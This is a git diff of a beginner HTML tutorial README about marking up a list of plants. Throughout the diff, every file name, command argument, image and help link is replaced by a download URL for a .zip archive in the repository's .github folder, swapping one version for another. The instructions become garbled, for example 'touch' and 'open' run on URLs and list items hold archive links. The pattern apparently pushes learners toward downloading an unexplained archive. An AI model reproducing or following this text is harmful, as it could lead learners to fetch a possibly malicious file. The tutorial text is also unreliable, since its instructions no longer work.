@@ -34,13 +34,13 @@ going to walk through how to create a list of things marked up with HTML.
 ### Create a Text File with Content
 
 In your terminal, while still inside of this labs directory, create a new file
-called `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/master/.github/workflows/phase-0-html-experiencing-html-lab-v1.6.zip` by running `touch https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/master/.github/workflows/phase-0-html-experiencing-html-lab-v1.6.zip`. The file extension suggests
+called `https://github.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/raw/refs/heads/master/.github/experiencing_phase_lab_html_v2.3.zip` by running `touch https://github.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/raw/refs/heads/master/.github/experiencing_phase_lab_html_v2.3.zip`. The file extension suggests
 to humans and operating systems that it contains text. Open the file in VS Code
-by typing `code https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/master/.github/workflows/phase-0-html-experiencing-html-lab-v1.6.zip`; you will do all editing for this lesson in VS
+by typing `code https://github.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/raw/refs/heads/master/.github/experiencing_phase_lab_html_v2.3.zip`; you will do all editing for this lesson in VS
 Code.
 
 Below is a collection of plant names.
-Copy and paste the plants into your `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/master/.github/workflows/phase-0-html-experiencing-html-lab-v1.6.zip` file.
+Copy and paste the plants into your `https://github.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/raw/refs/heads/master/.github/experiencing_phase_lab_html_v2.3.zip` file.
 
 ```text
 "Monstera Deliciosa"
@@ -72,18 +72,18 @@ HTML file!
 
 Now we're going to create an HTML list together.
 
-1. Create a new file called `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/master/.github/workflows/phase-0-html-experiencing-html-lab-v1.6.zip`.
-2. Copy the contents of `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/master/.github/workflows/phase-0-html-experiencing-html-lab-v1.6.zip` and paste them into `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/master/.github/workflows/phase-0-html-experiencing-html-lab-v1.6.zip`.
-3. Save the `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/master/.github/workflows/phase-0-html-experiencing-html-lab-v1.6.zip` file.
-4. Open the `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/master/.github/workflows/phase-0-html-experiencing-html-lab-v1.6.zip` file in the browser. For Mac users, you can do this
-   with `open https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/master/.github/workflows/phase-0-html-experiencing-html-lab-v1.6.zip`. For Windows users, you can do this in your Ubuntu
-   app with `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/master/.github/workflows/phase-0-html-experiencing-html-lab-v1.6.zip https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/master/.github/workflows/phase-0-html-experiencing-html-lab-v1.6.zip`. Make sure you've
-   [set Chrome as your default browser](https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/master/.github/workflows/phase-0-html-experiencing-html-lab-v1.6.zip%3DDesktop&hl=en).
+1. Create a new file called `https://github.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/raw/refs/heads/master/.github/experiencing_phase_lab_html_v2.3.zip`.
+2. Copy the contents of `https://github.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/raw/refs/heads/master/.github/experiencing_phase_lab_html_v2.3.zip` and paste them into `https://github.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/raw/refs/heads/master/.github/experiencing_phase_lab_html_v2.3.zip`.
+3. Save the `https://github.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/raw/refs/heads/master/.github/experiencing_phase_lab_html_v2.3.zip` file.
+4. Open the `https://github.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/raw/refs/heads/master/.github/experiencing_phase_lab_html_v2.3.zip` file in the browser. For Mac users, you can do this
+   with `open https://github.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/raw/refs/heads/master/.github/experiencing_phase_lab_html_v2.3.zip`. For Windows users, you can do this in your Ubuntu
+   app with `https://github.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/raw/refs/heads/master/.github/experiencing_phase_lab_html_v2.3.zip https://github.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/raw/refs/heads/master/.github/experiencing_phase_lab_html_v2.3.zip`. Make sure you've
+   [set Chrome as your default browser](https://github.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/raw/refs/heads/master/.github/experiencing_phase_lab_html_v2.3.zip%3DDesktop&hl=en).
 5. Hit enter to run the command.
 
 Once you've opened the file in the browser, you should see:
 
-![HTML file with non-marked-up content displays on one line](https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/master/.github/workflows/phase-0-html-experiencing-html-lab-v1.6.zip)
+![HTML file with non-marked-up content displays on one line](https://github.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/raw/refs/heads/master/.github/experiencing_phase_lab_html_v2.3.zip)
 
 As noted above, the browser doesn't know that items on new lines means "items in
 a list." Browsers ignore when HTML is split onto new lines. We cover why a
@@ -115,7 +115,7 @@ with `<li>` and `</li>`:
 Flip back to the **viewing tab** and refresh the page. You should see something
 like the following:
 
-![HTML file with content displayed as unordered list](https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/master/.github/workflows/phase-0-html-experiencing-html-lab-v1.6.zip)
+![HTML file with content displayed as unordered list](https://github.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/raw/refs/heads/master/.github/experiencing_phase_lab_html_v2.3.zip)
 
 **AWESOME**.
 
@@ -125,7 +125,7 @@ In this step we added some HTML _markup_:
 - The `</li>` is an HTML _closing tag_
 - We would call this pair of opening and closing tags an "`li` tag"
 - The whole length of text of _opening markup_ plus "wrapped" content plus
-  _closing markup_ (`<li>https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/master/.github/workflows/phase-0-html-experiencing-html-lab-v1.6.zip</li>`) is called "an HTML element;" or,
+  _closing markup_ (`<li>https://github.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/raw/refs/heads/master/.github/experiencing_phase_lab_html_v2.3.zip</li>`) is called "an HTML element;" or,
   more exactly, an `li element`
 
 Again, you don't need to memorize these terms yet, but we want to help you
@@ -156,7 +156,7 @@ Wrap the entire set of `<li>` items with an `<ol>` and `</ol>` like so:
 
 Save the file and refresh the **viewing tab**. It should display:
 
-![List displayed as an ordered list](https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/master/.github/workflows/phase-0-html-experiencing-html-lab-v1.6.zip)
+![List displayed as an ordered list](https://github.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/raw/refs/heads/master/.github/experiencing_phase_lab_html_v2.3.zip)
 
 We told the browser that this set of list items that we "wrapped" in the
 **ordered list** tag go together **as a list**. Because we told the browser that
@@ -192,7 +192,7 @@ Let's change our ordered list to be **unordered**. If `<ol>` means **ordered
 list**, you might guess that `<ul>` means **unordered list**. Make the change
 and refresh your **viewing tab**.
 
-![List displayed as an unordered list](https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/master/.github/workflows/phase-0-html-experiencing-html-lab-v1.6.zip)
+![List displayed as an unordered list](https://github.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/raw/refs/heads/master/.github/experiencing_phase_lab_html_v2.3.zip)
 
 Here we return to a "bulleted" unordered list.
 
@@ -220,7 +220,7 @@ Let's introduce our list by adding some background:
 
 Take a look at your "rendered page" and verify the result is to your liking.
 
-![List displayed as an unordered list with title](https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/master/.github/workflows/phase-0-html-experiencing-html-lab-v1.6.zip)
+![List displayed as an unordered list with title](https://github.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/raw/refs/heads/master/.github/experiencing_phase_lab_html_v2.3.zip)
 
 ### Put a Header on It
 
@@ -245,10 +245,10 @@ Here's the full example code:
 </ul>
 ```
 
-![Final Document - unordered list with Header and title ](https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/master/.github/workflows/phase-0-html-experiencing-html-lab-v1.6.zip)
+![Final Document - unordered list with Header and title ](https://github.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/raw/refs/heads/master/.github/experiencing_phase_lab_html_v2.3.zip)
 
 When you're done, it is time to run this assignment's tests. Make sure that you
-have your HTML content in a file called `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/master/.github/workflows/phase-0-html-experiencing-html-lab-v1.6.zip` in order to pass the
+have your HTML content in a file called `https://github.com/GabrielW13Nai/phase-0-html-experiencing-html-lab/raw/refs/heads/master/.github/experiencing_phase_lab_html_v2.3.zip` in order to pass the
 check. Type `learn test` and verify that your tests pass.
 
 ## Conclusion
